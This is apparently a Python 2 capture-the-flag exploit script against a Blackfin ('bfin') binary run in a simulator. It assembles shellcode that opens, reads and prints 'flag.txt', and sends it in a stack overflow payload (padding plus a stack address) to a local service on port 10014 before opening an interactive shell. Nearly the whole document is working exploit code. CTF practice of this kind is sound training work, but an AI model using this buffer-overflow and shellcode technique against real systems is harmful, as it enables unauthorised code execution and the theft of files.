asm = '''.section .text
.global _start
.ascii "%s"
_start:
    JUMP get_addr
ret:
    R3 = RETS
open:
    R0 = R3
    R1 = 0
    R2 = R1
	P0	= 5
	EXCPT	0
read:
    R1 = R7
    R2 = 0x7f
	P0	= 3
	EXCPT	0
write:
    R0.H = 0
    R0.L = 1
    R1 = R7
    R2 = 0x7f
	P0	= 4
	EXCPT	0
exit:
	P0	= 1
	EXCPT	0
get_addr:
    CALL ret
.ascii "%s"
'''

import os
from lib.mylib import *

ARCH = 'bfin'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10014
s = mysock(IP, PORT)
sl(s, '\n000')
SP = 0x1b00
shellcode = 'AAAAAAAAAAAAAAAA' + p(SP) + shellcode + '\n'
sl(s, shellcode)
shell(s)

'''
target sim --environment user
load bin/easy/bfin-elf.x
r
'''
